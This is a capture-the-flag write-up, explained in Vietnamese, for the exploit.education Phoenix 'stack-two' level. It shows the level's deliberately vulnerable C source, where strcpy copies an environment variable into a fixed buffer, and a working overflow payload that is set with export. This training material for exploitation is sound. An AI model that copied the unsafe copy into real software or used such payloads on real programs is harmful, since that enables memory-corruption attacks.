## <center>[STACK TWO](https://exploit.education/phoenix/stack-two/)</center>
>Stack Two takes a look at environment variables, and how they can be set.

#### Source code
```c
/*
 * phoenix/stack-two, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * If you're Russian to get to the bath room, and you are Finnish when you get
 * out, what are you when you are in the bath room?
 *
 * European!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```
### Solution:
+ Level này yêu cầu ta cần setup biến môi trường `ExploitEducation`
+ Nhìn vào source code ta thấy nếu biến môi trường không được setup thì sẽ trả về lỗi, ngược lại thì giá trị của biến môi trường `ExploitEducation` sẽ được đưa vào `buffer`
+ Như vậy tới đây tương tự như [stack-one](https://exploit.education/phoenix/stack-one/) thì ta cần setup cho biến môi trường giá trị để có thể làm thay đổi giá trị `changeme` thành `0x0d0a090a`
+ Để thiết lập biến môi trường ta sử dụng lệnh `export`   
```
user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=$(python -c 'print "a"*64 + "\x0a\x09\x0a\x0d"')
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```